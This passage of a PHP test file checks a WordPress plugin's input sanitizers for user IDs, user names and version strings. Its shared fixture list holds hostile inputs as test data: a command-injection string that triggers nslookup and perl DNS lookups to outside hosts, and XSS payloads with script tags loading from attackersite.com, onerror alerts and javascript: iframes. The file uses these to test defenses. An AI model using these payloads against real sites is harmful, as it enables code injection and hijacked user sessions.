        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
        $user1->ID,
    ]);
});

test('sanitize user ids', function () {
    createUsers(2);
    // get_users() hands the IDs back as numeric STRINGS; the sanitizer's contract is ints,
    // which is exactly the kind of thing toBe() is here to pin — so cast the fixture.
    $users = array_map('intval', get_users(['fields' => 'ID']));
    $values = sanitizerTestValues();
    $values[] = $users[0];
    $values[] = $users;
    $values[] = implode(',', $users);
    $values[] = array_diff(range(1, 20), $users);
    $sanitized = sanitizeValues('user-ids', $values);
    expect($sanitized)->toBe([
        [],
        [],
        array_intersect($users, array_map('intval', $values[2])),
        [],
        array_intersect($values[4], $users),
        [],
        array_intersect($values[6], $users),
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [],
        [$users[0]],
        $users,
        $users,
        [],
    ]);
});

test('sanitize user name', function () {
    $user = createUserAndGet();
    wp_set_current_user($user->ID);
    $values = sanitizerTestValues();
    $values[] = $user->display_name;
    $values[] = 'Łukasz';
    $values[] = 'မောင်မောင် အောင်မျိုး ကိုကိုဦး မိုးမြင့်သန္တာ';
    $sanitized = sanitizeValues('user-name', $values);
    expect($sanitized)->toBe([
        '',
        'abc',
        '1',
        '',
        '13',
        '0',
        '13',
        '',
        '1',
        '',
        '',
        'This is a title',
        'nslookup hit-gxwgukmocpc5c8dddd.comperl -e gethostbyname\'hissstgxwgukmocpc5c80.me\'',
        'June 13, 1989',
        '03-12-2020',
        '0-0-2020',
        '2020',
        '李祖阳 xx xx',
        'axdextomorrow 200 200',
        'this is true',
        'single-review full-width alert69',
        'matt',
        'httpswordpress.org',
        'wordpress.org',
        'www.wordpress.org',
        'httpswordpress.org',
        '-1',
        'Hello this is a link and a link',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        $user->display_name,
        'Łukasz',
        'မောင်မောင် အောင်မျိုး ကိုကိုဦး မိုးမြင့်သန္တာ',
    ]);
    $sanitized = sanitizeValues('user-name:current_user', $values);
    expect($sanitized)->toBe([
        $user->display_name,
        'abc',
        '1',
        $user->display_name,
        '13',
        '0',
        '13',
        $user->display_name,
        '1',
        $user->display_name,
        $user->display_name,
        'This is a title',
        'nslookup hit-gxwgukmocpc5c8dddd.comperl -e gethostbyname\'hissstgxwgukmocpc5c80.me\'',
        'June 13, 1989',
        '03-12-2020',
        '0-0-2020',
        '2020',
        '李祖阳 xx xx',
        'axdextomorrow 200 200',
        'this is true',
        'single-review full-width alert69',
        'matt',
        'httpswordpress.org',
        'wordpress.org',
        'www.wordpress.org',
        'httpswordpress.org',
        '-1',
        'Hello this is a link and a link',
        $user->display_name,
        $user->display_name,
        $user->display_name,
        $user->display_name,
        $user->display_name,
        $user->display_name,
        $user->display_name,
        $user->display_name,
        $user->display_name,
        'Łukasz',
        'မောင်မောင် အောင်မျိုး ကိုကိုဦး မိုးမြင့်သန္တာ',
    ]);
});

test('sanitize version', function () {
    $values = sanitizerTestValues();
    $values[] = 'v1.1.1';
    $values[] = 'v1';
    $values[] = '1.1.1.1';
    $values[] = '1.1.1';
    $values[] = '1.1.1a';
    $values[] = '1.1.beta';
    $values[] = '1.1.beta23';
    $values[] = '1.1..1beta23';
    $values[] = '1.1.1beta23';
    $values[] = '1.1.1-beta23';
    $values[] = '1.1.1-beta.1';
    $sanitized = sanitizeValues('version', $values);
    expect($sanitized)->toBe([
        '',
        '',
        '1',
        '',
        '13',
        '0',
        '13',
        '',
        '1',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '2020',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '',
        '1.1.1',
        '',
        '',
        '',
        '',
        '',
        '1.1.1-beta23',
        '1.1.1-beta.1',
    ]);
});

function sanitizeValues(string $sanitizer, array $values = [])
{
    if (empty($values)) {
        $values = sanitizerTestValues();
    }
    $sanitizers = array_fill_keys(array_keys($values), $sanitizer);
    return (new Sanitizer($values, $sanitizers))->run();
}

/**
 * The corpus every sanitizer runs against unless a test passes its own.
 */
function sanitizerTestValues(): array
{
    return [
        '',
        'abc',
        ['1'],
        ['a' => false],
        [13],
        [0],
        ['1' => 13],
        (object) ['b' => true],
        true,
        false,
        '<script>var x = 23;</script>',
        "<h3>This is a\n title!</h3>",
        ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
        'June 13, 1989',
        '03-12-2020',
        '0-0-2020',
        '2020',
        '李祖阳 xx xx',
        '#ax+dex(tomorrow) $200 200% @peter',
        'this is true',
        'single-review full-width" onmouseover="alert(69)',
        'matt@wordpress.org',
        'https//wordpress.org',
        'wordpress.org',
        'www.wordpress.org',
        'https://wordpress.org',
        -1,
        '<div><span><a id="xxx" href="https://apple.com" title="hello" target="_blank"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>',
        '<img sr<img src="x">c=x onerror=alert(55)>',
        '<script sr<img src="x">c=https://attackersite.com/test.js>',
        '&lt;img src=x alert(55)&gt;',
        '&amp;lt;script src=https://attackersite.com/test.js&amp;gt;',
        '&amp;lt;iframe src=javascript:alert(1)&amp;gt;',
        '<noscript> &amp;lt;p title=" &lt;/noscript&gt;&lt;style onload= alert(document.domain)//&quot;&gt; *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} &lt;/style&gt;',
        '&amp;amp;amp;amp;amp;amp;amp;amp;lt;img src ooooonerror=nerror=nerror=nerror=nerror=alert(/XSS-Img/)&amp;amp;amp;amp;amp;amp;amp;amp;gt;',
        '&amp;amp;amp;amp;amp;amp;amp;amp;lt;iframe src=javascript:alert(/XSS-iFrame)&amp;amp;amp;amp;amp;amp;amp;amp;gt;',
    ];
}
